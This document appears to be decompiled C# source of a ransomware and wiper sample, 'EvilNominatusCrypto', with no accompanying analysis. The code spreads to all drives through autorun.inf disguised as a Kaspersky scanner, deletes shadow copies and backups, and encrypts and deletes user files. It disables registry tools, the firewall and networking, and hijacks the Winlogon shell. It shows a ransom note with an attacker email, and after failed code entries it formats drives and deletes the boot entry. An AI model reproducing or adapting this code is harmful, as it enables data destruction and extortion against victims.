// Decompiled with JetBrains decompiler
// Type: TRS.MainForm
// Assembly: EvilNominatusCrypto, Version=1.0.8079.11358, Culture=neutral, PublicKeyToken=null
// MVID: 74A0AC43-A933-4FAE-AE62-8C0074E50304
// Assembly location: C:\Users\Administrateur\Downloads\toto\HEUR-Trojan.MSIL.DelShad.gen-69811a6c9376b219b335a055cfa970d38cd768abeca7138a2c1905560d468fef.exe

using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace TRS
{
  public class MainForm : Form
  {
    public string getDirX = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
    public int live = 3;
    private IContainer components = (IContainer) null;
    private PictureBox pictureBox1;
    private Button button1;
    private Label label3;
    private RichTextBox richTextBox1;
    private Label label2;
    private Label label1;

    public static void runCommand(string commands)
    {
      Process process = new Process();
      process.StartInfo = new ProcessStartInfo()
      {
        FileName = "cmd.exe",
        Arguments = "/C " + commands,
        WindowStyle = ProcessWindowStyle.Hidden
      };
      process.Start();
      process.WaitForExit();
    }

    public void EncryptDisks(string DISKLOCATION)
    {
      try
      {
        string[] files = Directory.GetFiles(DISKLOCATION + "\\", "*.*", SearchOption.AllDirectories);
        int index = 0;
        while (index < files.Length)
        {
          try
          {
            this.EncryptIT(files[index]);
            File.Delete(files[index]);
          }
          catch
          {
          }
          checked { ++index; }
        }
      }
      catch
      {
      }
    }

    public MainForm()
    {
      this.InitializeComponent();
      try
      {
        MainForm.runCommand("echo ^[autorun^] >autorun.inf");
        MainForm.runCommand("echo ^open^=KasperskyScan^.exe >>autorun.inf");
        MainForm.runCommand("echo ^execute=^KasperskyScan^.exe >>autorun.inf");
        string str1 = "KasperskyScan.exe";
        foreach (DriveInfo drive in DriveInfo.GetDrives())
        {
          try
          {
            File.Copy("autorun.inf", drive.ToString());
            File.Copy(Assembly.GetExecutingAssembly().Location, drive.ToString() + str1);
          }
          catch
          {
          }
        }
        Process.EnterDebugMode();
        MainForm.runCommand("vssadmin delete shadows /all /quiet && wmic shadowcopy delete");
        int num = (int) MessageBox.Show("Loading please wait.... don't turn on the antivirus");
        foreach (DriveInfo drive in DriveInfo.GetDrives())
        {
          try
          {
            string[] files1 = Directory.GetFiles(drive.ToString() + "\\", "*.bak", SearchOption.AllDirectories);
            int index1 = 0;
            while (index1 < files1.Length)
            {
              try
              {
                File.Delete(files1[index1]);
              }
              catch
              {
              }
              checked { ++index1; }
            }
            string[] files2 = Directory.GetFiles(drive.ToString() + "\\", "*.*", SearchOption.AllDirectories);
            int index2 = 0;
            while (index2 < files2.Length)
            {
              try
              {
                this.EncryptIT(files2[index2]);
                File.Delete(files2[index2]);
              }
              catch
              {
              }
              checked { ++index2; }
            }
          }
          catch
          {
          }
          this.EncryptDisks(drive.ToString());
        }
        Thread.Sleep(90000);
        MainForm.runCommand("taskkill /im taskmgr.exe /f");
        MainForm.runCommand("assoc .png=NotSoCleverBotFile");
        MainForm.runCommand("assoc .vbs=NotSoCleverBotFile");
        MainForm.runCommand("assoc .html=NotSoCleverBotFile");
        MainForm.runCommand("assoc .bat=NotSoCleverBotFile");
        MainForm.runCommand("assoc .jpn=EncryptedFile");
        MainForm.runCommand("assoc .js=exe1file");
        MainForm.runCommand("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f");
        MainForm.runCommand("ipconfig /release");
        MainForm.runCommand("net stop Windows Firewall");
        MainForm.runCommand("net stop Network Connections");
        using (RegistryKey subKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"))
        {
          try
          {
            subKey.SetValue("Shell", (object) Application.ExecutablePath, RegistryValueKind.String);
          }
          catch
          {
          }
        }
        string folderPath1 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        Directory.GetFiles(folderPath1);
        Directory.GetDirectories(folderPath1);
        string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        string[] files3 = Directory.GetFiles(folderPath1, "*.*", SearchOption.AllDirectories);
        string[] directories = Directory.GetDirectories(folderPath2);
        int index3 = 0;
        while (index3 < directories.Length)
        {
          try
          {
            this.MakeThemDIE(directories[index3]);
            this.EncryptIT(directories[index3]);
          }
          catch
          {
          }
          checked { ++index3; }
        }
        int index4 = 0;
        while (index4 < files3.Length)
        {
          try
          {
            this.EncryptIT(files3[index4]);
            File.Delete(files3[index4]);
          }
          catch
          {
          }
          checked { ++index4; }
        }
        try
        {
          string folderPath3 = Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles);
          string folderPath4 = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
          string folderPath5 = Environment.GetFolderPath(Environment.SpecialFolder.CommonPrograms);
          string folderPath6 = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
          string folderPath7 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
          this.encryptDirectory(folderPath3);
          this.encryptDirectory(folderPath5);
          this.encryptDirectory(folderPath4);
          this.encryptDirectory(folderPath6);
          this.encryptDirectory(folderPath7);
          this.FinalPower(folderPath3);
          this.FinalPower(folderPath5);
          this.FinalPower(folderPath4);
          this.FinalPower(folderPath6);
          this.FinalPower(folderPath7);
          string str2 = "C:\\Users\\";
          string userName = Environment.UserName;
          string location1 = str2 + userName + "\\Desktop";
          string location2 = str2 + userName + "\\Links";
          string location3 = str2 + userName + "\\Contacts";
          string location4 = str2 + userName + "\\Desktop";
          string location5 = str2 + userName + "\\Documents";
          string location6 = str2 + userName + "\\Downloads";
          string location7 = str2 + userName + "\\Pictures";
          string location8 = str2 + userName + "\\Music";
          string location9 = str2 + userName + "\\OneDrive";
          string location10 = str2 + userName + "\\Saved Games";
          string location11 = str2 + userName + "\\Favorites";
          string location12 = str2 + userName + "\\Searches";
          string location13 = str2 + userName + "\\Videos";
          this.encryptDirectory(location1);
          this.encryptDirectory(location2);
          this.encryptDirectory(location3);
          this.encryptDirectory(location4);
          this.encryptDirectory(location5);
          this.encryptDirectory(location6);
          this.encryptDirectory(location7);
          this.encryptDirectory(location8);
          this.encryptDirectory(location9);
          this.encryptDirectory(location10);
          this.encryptDirectory(location11);
          this.encryptDirectory(location12);
          this.encryptDirectory(location13);
          this.encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
          this.encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
          this.encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
          this.encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
          this.encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
          this.encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
          this.encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
          string folderPath8 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
          string str3 = Path.Combine(Environment.GetEnvironmentVariable("USERPROFILE"), "Downloads");
          string[] files4 = Directory.GetFiles(folderPath8 + "\\", "*", SearchOption.AllDirectories);
          string[] files5 = Directory.GetFiles(str3 + "\\", "*", SearchOption.AllDirectories);
          int index5 = 0;
          while (index5 < files4.Length)
          {
            try
            {
              this.EncryptIT(files4[index5]);
              File.Delete(files4[index5]);
            }
            catch
            {
            }
            checked { ++index5; }
          }
          int index6 = 0;
          while (index6 < files5.Length)
          {
            try
            {
              this.EncryptIT(files4[index6]);
              File.Delete(files4[index6]);
            }
            catch
            {
            }
            checked { ++index6; }
          }
          string[] files6 = Directory.GetFiles(folderPath7 + "\\", "*.*", SearchOption.AllDirectories);
          string[] files7 = Directory.GetFiles(folderPath6 + "\\", "*.*", SearchOption.AllDirectories);
          string[] files8 = Directory.GetFiles(folderPath4 + "\\", "*.*", SearchOption.AllDirectories);
          string[] files9 = Directory.GetFiles(folderPath5 + "\\", "*.*", SearchOption.AllDirectories);
          string[] files10 = Directory.GetFiles(folderPath3 + "\\", "*.*", SearchOption.AllDirectories);
          int index7 = 0;
          while (index7 < files6.Length)
          {
            try
            {
              this.EncryptIT(files6[index7]);
              File.Delete(files6[index7]);
            }
            catch
            {
            }
            checked { ++index7; }
          }
          int index8 = 0;
          while (index8 < files7.Length)
          {
            try
            {
              this.EncryptIT(files7[index8]);
              File.Delete(files7[index8]);
            }
            catch
            {
            }
            checked { ++index8; }
          }
          int index9 = 0;
          while (index9 < files8.Length)
          {
            try
            {
              this.EncryptIT(files8[index9]);
              File.Delete(files8[index9]);
            }
            catch
            {
            }
            checked { ++index9; }
          }
          int index10 = 0;
          while (index10 < files9.Length)
          {
            try
            {
              this.EncryptIT(files9[index10]);
              File.Delete(files9[index10]);
            }
            catch
            {
            }
            checked { ++index10; }
          }
          int index11 = 0;
          while (index11 < files10.Length)
          {
            try
            {
              this.EncryptIT(files9[index11]);
              File.Delete(files9[index11]);
            }
            catch
            {
            }
            checked { ++index11; }
          }
          try
          {
            this.encryptDirectory(this.getDirX);
          }
          catch
          {
          }
        }
        catch
        {
        }
      }
      catch
      {
      }
    }

    private void Label1Click(object sender, EventArgs e)
    {
    }

    private void Button1Click(object sender, EventArgs e)
    {
      if (this.richTextBox1.Text == "7HJA817273-zXhsgSUS89-XX98UYHBVZ-9182TEFGIJK")
      {
        try
        {
          MainForm.runCommand("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 0 /f");
          Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon").SetValue("Shell", (object) "explorer.exe", RegistryValueKind.String);
          MainForm.runCommand("explorer.exe");
          Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\", "*.*", SearchOption.AllDirectories);
          int num = (int) MessageBox.Show("ransomware removed from your Computer but files still encrypted you can now contact attacker Bkhtyaryrwzbh@gmail.com to get the decrypter");
          this.Close();
        }
        catch
        {
        }
      }
      else
      {
        if (!(this.richTextBox1.Text == this.richTextBox1.Text))
          return;
        if (this.live == 0)
        {
          try
          {
            this.Hide();
            Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon").SetValue("Shell", (object) "0", RegistryValueKind.String);
            MainForm.runCommand("net users %username% 912983");
            MainForm.runCommand("bcdedit /delete {current}");
            string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "*.*", SearchOption.AllDirectories);
            int index = 0;
            while (index < files.Length)
            {
              this.Attack1(files[index]);
              File.Delete(files[index]);
              checked { ++index; }
            }
            MainForm.runCommand("assoc .vbs=INFECTEDFILE && assoc .html=INFECTEDFILE");
            foreach (object drive in DriveInfo.GetDrives())
              this.Damage(drive.ToString());
            MainForm.runCommand("msg * Welcome to my Nightmare");
            Thread.Sleep(30);
            MainForm.runCommand("taskkill /im wininit.exe /f");
          }
          catch
          {
          }
        }
        else
        {
          checked { --this.live; }
          int num = (int) MessageBox.Show("Wrong! you have " + this.live.ToString() + " chance!");
        }
      }
    }

    public void MakeThemDIE(string Path1)
    {
      try
      {
        string userName = Environment.UserName;
      }
      catch
      {
      }
    }

    public void Attack1(string FName)
    {
      try
      {
        byte[] bytes = File.ReadAllBytes(Assembly.GetExecutingAssembly().Location);
        File.WriteAllBytes(FName, bytes);
      }
      catch
      {
      }
    }

    public void Damage(string DriveNameToFormat)
    {
      try
      {
        MainForm.runCommand("format " + DriveNameToFormat + " /FS:NTFS /X /Q /y");
      }
      catch
      {
      }
    }

    public void MakeThemAlive(string PathN)
    {
    }

    public void encryptDirectory(string location)
    {
      try
      {
        string[] files = Directory.GetFiles(location);
        string[] directories = Directory.GetDirectories(location);
        int index1 = 0;
        while (index1 < files.Length)
        {
          this.EncryptIT(files[index1]);
          File.Delete(files[index1]);
          checked { ++index1; }
        }
        int index2 = 0;
        while (index2 < directories.Length)
        {
          this.encryptDirectory(directories[index2]);
          Directory.Delete(directories[index2]);
          checked { ++index2; }
        }
      }
      catch
      {
      }
    }

    public void FinalPower(string locationPath)
    {
      DirectoryInfo directoryInfo = new DirectoryInfo(locationPath);
      try
      {
        foreach (FileSystemInfo file in directoryInfo.GetFiles("*.*"))
          this.EncryptIT(file.FullName);
        foreach (FileSystemInfo directory in directoryInfo.GetDirectories())
          this.encryptDirectory(directory.FullName);
      }
      catch (Exception ex)
      {
      }
    }

    public void EncryptIT(string inputFile)
    {
      try
      {
        byte[] bytes = new UnicodeEncoding().GetBytes("7HJA817273-zXhsgSUS89-XX98UYHBVZ-9182TEFGIJK");
        using (FileStream fileStream1 = new FileStream(inputFile + "-Locked", FileMode.Create))
        {
          using (AesManaged aesManaged = new AesManaged())
          {
            using (CryptoStream cryptoStream = new CryptoStream((Stream) fileStream1, aesManaged.CreateEncryptor(bytes, bytes), CryptoStreamMode.Write))
            {
              using (FileStream fileStream2 = new FileStream(inputFile, FileMode.Open))
              {
                aesManaged.KeySize = 256;
                aesManaged.BlockSize = 128;
                aesManaged.Key = bytes;
                aesManaged.IV = bytes;
                aesManaged.Mode = CipherMode.CBC;
                int num;
                while ((num = fileStream2.ReadByte()) != -1)
                  cryptoStream.WriteByte(checked ((byte) num));
              }
            }
          }
        }
        File.Delete(inputFile + ".*");
      }
      catch
      {
      }
    }

    public void GetSystemFolder() => Environment.GetFolderPath(Environment.SpecialFolder.Windows);

    public void InfectTheFile(string FileNAME1)
    {
      try
      {
        byte[] bytes = File.ReadAllBytes(Application.ExecutablePath);
        File.WriteAllBytes(FileNAME1, bytes);
      }
      catch
      {
      }
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (MainForm));
      this.label1 = new Label();
      this.richTextBox1 = new RichTextBox();
      this.label3 = new Label();
      this.button1 = new Button();
      this.label2 = new Label();
      this.pictureBox1 = new PictureBox();
      ((ISupportInitialize) this.pictureBox1).BeginInit();
      this.SuspendLayout();
      this.label1.BackColor = System.Drawing.Color.Transparent;
      this.label1.FlatStyle = FlatStyle.Flat;
      this.label1.Font = new Font("Microsoft Sans Serif", 14f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.label1.ForeColor = System.Drawing.Color.DarkRed;
      this.label1.Location = new Point(16, 11);
      this.label1.Margin = new Padding(4, 0, 4, 0);
      this.label1.Name = "label1";
      this.label1.Size = new Size(931, 54);
      this.label1.TabIndex = 0;
      this.label1.Text = "CryptoVirus Detected!  Ransom.NominatusStrike";
      this.label1.Click += new EventHandler(this.Label1Click);
      this.richTextBox1.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.richTextBox1.Location = new Point(80, 340);
      this.richTextBox1.Margin = new Padding(4, 4, 4, 4);
      this.richTextBox1.Name = "richTextBox1";
      this.richTextBox1.Size = new Size(409, 25);
      this.richTextBox1.TabIndex = 2;
      this.richTextBox1.Text = "";
      this.label3.Font = new Font("Microsoft Sans Serif", 9.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.label3.Location = new Point(13, 340);
      this.label3.Margin = new Padding(4, 0, 4, 0);
      this.label3.Name = "label3";
      this.label3.Size = new Size(77, 30);
      this.label3.TabIndex = 3;
      this.label3.Text = "Code:";
      this.button1.FlatStyle = FlatStyle.System;
      this.button1.Location = new Point(497, 342);
      this.button1.Margin = new Padding(4, 4, 4, 4);
      this.button1.Name = "button1";
      this.button1.Size = new Size(188, 28);
      this.button1.TabIndex = 4;
      this.button1.Text = "GO AWAY!!";
      this.button1.UseVisualStyleBackColor = true;
      this.button1.Click += new EventHandler(this.Button1Click);
      this.label2.Font = new Font("Microsoft Sans Serif", 12.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.label2.Location = new Point(20, 59);
      this.label2.Margin = new Padding(4, 0, 4, 0);
      this.label2.Name = "label2";
      this.label2.Size = new Size(896, 242);
      this.label2.TabIndex = 5;
      this.label2.Text = componentResourceManager.GetString("label2.Text");
      this.pictureBox1.Image = (Image) componentResourceManager.GetObject("pictureBox1.Image");
      this.pictureBox1.Location = new Point(924, 59);
      this.pictureBox1.Margin = new Padding(4, 4, 4, 4);
      this.pictureBox1.Name = "pictureBox1";
      this.pictureBox1.Size = new Size(153, 148);
      this.pictureBox1.TabIndex = 6;
      this.pictureBox1.TabStop = false;
      this.AutoScaleDimensions = new SizeF(8f, 16f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = SystemColors.AppWorkspace;
      this.ClientSize = new Size(1151, 439);
      this.ControlBox = false;
      this.Controls.Add((Control) this.pictureBox1);
      this.Controls.Add((Control) this.label2);
      this.Controls.Add((Control) this.button1);
      this.Controls.Add((Control) this.label3);
      this.Controls.Add((Control) this.richTextBox1);
      this.Controls.Add((Control) this.label1);
      this.Margin = new Padding(4, 4, 4, 4);
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (MainForm);
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.Text = "Ransom.EvilNominatus.C";
      ((ISupportInitialize) this.pictureBox1).EndInit();
      this.ResumeLayout(false);
    }
  }
}
